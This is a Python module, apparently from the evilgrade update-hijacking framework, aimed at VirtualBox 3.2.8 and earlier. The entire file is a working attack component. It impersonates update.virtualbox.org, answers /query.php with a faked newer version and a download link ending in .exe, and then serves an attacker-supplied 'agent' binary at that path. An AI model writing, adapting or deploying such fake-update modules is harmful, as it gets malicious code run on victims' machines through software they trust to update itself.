from modules import ModuleBase


class VirtualBox(ModuleBase):
    name = 'VirtualBox'
    appver = '<= 3.2.8 r64453'
    version = '1.1'
    author = ['Andres Pazos < apazos +[AT]+ infobytesec.com>']
    description = ''
    vh = 'update.virtualbox.org'
    options = {
        'version': {
            'val' : "'5.' + rand_num(3) + '.' + rand_num(1)",
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': '"A" * 10',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
            'path': '/query.php',
            'type': 'string',
            'method': '',
            'bin': '',
            'string': '<%VERSION%> http://update.virtualhost.org/update<%RND1%>.exe',
            'parse': '1',
            'file': ''
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]